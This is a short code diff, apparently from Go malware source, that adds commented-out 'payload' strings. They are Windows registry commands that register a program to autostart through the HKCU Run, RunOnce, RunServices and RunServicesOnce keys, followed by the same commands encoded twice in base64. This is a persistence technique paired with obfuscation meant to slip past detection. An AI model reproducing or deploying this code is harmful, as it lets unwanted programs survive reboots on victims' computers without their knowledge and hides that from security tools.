@@ -1,0 +1,12 @@
+/*
+		pld1 := "REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v lol /t REG_SZ /d " + src
+		pld2 := "REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v lol /t REG_SZ /d " + src
+		pld3 := "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v lol /t REG_SZ /d " + src
+		pld4 := "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v lol /t REG_SZ /d " + src
+	*/
+	/*
+		pld1 := "VWtWSElFRkVSQ0JjSWtoTFJWbGZRMVZTVWtWT1ZGOVZVMFZTWEZ4VGIyWjBkMkZ5WlZ4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeERkWEp5Wlc1MFZtVnljMmx2Ymx4Y1VuVnVYQ0lnTDNZZ2JHOXNJQzkwSUZKRlIxOVRXaUF2WkNBPQ=="
+		pld2 := "VWtWSElFRkVSQ0JjSWtoTFJWbGZRMVZTVWtWT1ZGOVZVMFZTWEZ4VGIyWjBkMkZ5WlZ4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeERkWEp5Wlc1MFZtVnljMmx2Ymx4Y1VuVnVUMjVqWlZ3aUlDOTJJR3h2YkNBdmRDQlNSVWRmVTFvZ0wyUWc="
+		pld3 := "VWtWSElFRkVSQ0JjSWtoTFJWbGZRMVZTVWtWT1ZGOVZVMFZTWEZ4VGIyWjBkMkZ5WlZ4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeERkWEp5Wlc1MFZtVnljMmx2Ymx4Y1VuVnVVMlZ5ZG1salpYTmNJaUF2ZGlCc2Iyd2dMM1FnVWtWSFgxTmFJQzlrSUE9PQ=="
+		pld4 := "VWtWSElFRkVSQ0JjSWtoTFJWbGZRMVZTVWtWT1ZGOVZVMFZTWEZ4VGIyWjBkMkZ5WlZ4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeERkWEp5Wlc1MFZtVnljMmx2Ymx4Y1VuVnVVMlZ5ZG1salpYTlBibU5sWENJZ0wzWWdiRzlzSUM5MElGSkZSMTlUV2lBdlpDQT0="
+	*/
